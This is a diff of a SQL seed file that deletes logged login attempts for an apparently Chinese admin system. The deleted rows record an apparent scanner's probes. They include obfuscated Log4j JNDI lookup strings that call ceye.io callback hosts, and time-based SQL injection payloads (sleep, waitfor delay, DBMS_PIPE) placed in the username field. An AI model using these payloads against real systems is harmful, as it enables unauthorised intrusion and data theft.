@@ -141,452 +141,369 @@ VALUES ('系统默认（无参）', 'DEFAULT', 'ryTask.ryNoParams', '0/10 * * * 
         '2023-01-30 13:46:10', '', NULL, ''),
        ('系统默认（多参）', 'DEFAULT', 'ryTask.ryMultipleParams(''ry'', true, 2000L, 316.50D, 100)', '0/20 * * * * ?', '3', '1',
         '1', 'admin', '2023-01-30 13:46:10', '', NULL, '');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '58.62.191.51', 'XX XX', 'Chrome 11', 'Windows 10', '0', '登录成功', '2023-04-05 22:01:37'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 15:14:33'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 15:19:58'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:26'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:26'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:26'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:26'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:27'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:27'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:27');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:27'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:20:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:20:36'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误1次', '2023-05-04 16:21:16'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:21:16'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:21:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:21:38'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:21:45'),
-       ('admin', '218.80.1.69', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2023-05-04 16:21:52'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:01');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:08'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:13'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:17'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:21'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:25'),
-       ('admin',
-        '${:-y$}{${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s://log4control.pengzh.1683188547057.dlzz.g77fqk.ceye.io/a}',
-        '内网IP', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:22:43'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误1次', '2023-05-04 16:22:43'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:53'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:56');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:22:59'),
-       ('admin', '218.80.1.69', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2023-05-04 16:23:03'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:08'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:12'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:15'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:18'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:22'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:24'),
-       ('admin', '${url:UTF-8:http://text4control.pengzh.1683188605372.WrFa.g77fqk.ceye.io/allbp}', '内网IP', 'Chrome 9',
-        'Windows 10', '0', '登录成功', '2023-05-04 16:23:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:30');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:23:36'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:23:47'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:23:49'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:23:52'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:23:55'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:24:08'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:24:12'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:24:16'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:24:20'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:24:20');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:24:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误1次', '2023-05-04 16:24:23'),
-       ('admin''', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin'' 不存在', '2023-05-04 16:24:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:24:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误2次', '2023-05-04 16:24:23'),
-       ('admin"', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin" 不存在', '2023-05-04 16:24:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:24:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误3次', '2023-05-04 16:24:23'),
-       ('admin\\', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin\\ 不存在', '2023-05-04 16:24:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:24:24');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误4次', '2023-05-04 16:24:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:24:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次', '2023-05-04 16:24:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:25'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:25'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:25'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:25'),
-       ('admin and sleep(5)', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin and sleep(5) 不存在',
-        '2023-05-04 16:24:25');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:26'),
-       ('admin''and sleep(5) and ''1', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin''and sleep(5) and ''1 不存在', '2023-05-04 16:24:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:26'),
-       ('admin"and sleep(5) and "1', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin"and sleep(5) and "1 不存在', '2023-05-04 16:24:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:27'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:28'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:28');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:29'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:30'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:30'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:32'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:32');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:32'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:32'),
-       ('admin''and(select/**/1)>0/**/waitfor/**/delay''0:0:5', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin''and(select/**/1)>0/**/waitfor/**/delay''0:0:5 不存在', '2023-05-04 16:24:33'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:33'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:33'),
-       ('admin"and(select/**/1)>0/**/waitfor/**/delay"0:0:5', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin"and(select/**/1)>0/**/waitfor/**/delay"0:0:5 不存在', '2023-05-04 16:24:33'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:34'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:34'),
-       ('admin/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE(''q'',5)', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE(''q'',5) 不存在', '2023-05-04 16:24:34'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:35');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:35'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:35'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:24:35'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:21'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:22'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:44:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:44:32'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:45:11'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误1次', '2023-05-04 16:45:11'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:45:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:45:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:45:35'),
-       ('admin', '218.80.1.69', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2023-05-04 16:45:40'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:45:49');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:45:56'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:00'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:05'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:09'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:14'),
-       ('admin', '${:-y$}{${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s://log4a.pengzh.1683189976745.GNiX.g77fqk.ceye.io/a}',
-        '内网IP', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:18'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:46:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误1次', '2023-05-04 16:46:31'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:47'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:52');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:46:56'),
-       ('admin', '218.80.1.69', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2023-05-04 16:47:03'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:12'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:16'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:19'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:26'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:30'),
-       ('admin', '${url:UTF-8:http://text4a.pengzh.1683190051764.ARPc.g77fqk.ceye.io/allbp}', '内网IP', 'Chrome 9',
-        'Windows 10', '0', '登录成功', '2023-05-04 16:47:33'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:36');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '0', '登录成功', '2023-05-04 16:47:42'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:47:53'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:47:56'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:47:58'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:48:01'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:48:10'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:48:13'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:48:15'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:48:17'),
-       ('', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：NONE_PROVIDED 不存在', '2023-05-04 16:48:17');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:48:20'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误1次', '2023-05-04 16:48:20'),
-       ('admin''', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin'' 不存在', '2023-05-04 16:48:20'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:48:20'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误2次', '2023-05-04 16:48:20'),
-       ('admin"', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin" 不存在', '2023-05-04 16:48:20'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:48:20'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误3次', '2023-05-04 16:48:20'),
-       ('admin\\', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin\\ 不存在', '2023-05-04 16:48:20'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:48:21');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误4次', '2023-05-04 16:48:21'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '用户不存在/密码错误', '2023-05-04 16:48:21'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次', '2023-05-04 16:48:21'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:21'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:21'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:22'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:22'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:22'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:22'),
-       ('admin and sleep(5)', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '登录用户：admin and sleep(5) 不存在',
-        '2023-05-04 16:48:22');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:23'),
-       ('admin''and sleep(5) and ''1', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin''and sleep(5) and ''1 不存在', '2023-05-04 16:48:23'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:24'),
-       ('admin"and sleep(5) and "1', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1',
-        '登录用户：admin"and sleep(5) and "1 不存在', '2023-05-04 16:48:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:24'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:25'),
-       ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:25');
-INSERT INTO melon.sys_logininfor (user_name, ipaddr, login_location, browser, os, status, msg, login_time)
-VALUES ('admin', '218.80.1.69', 'XX XX', 'Chrome 9', 'Windows 10', '1', '密码输入错误5次，帐户锁定10分钟', '2023-05-04 16:48:26'),
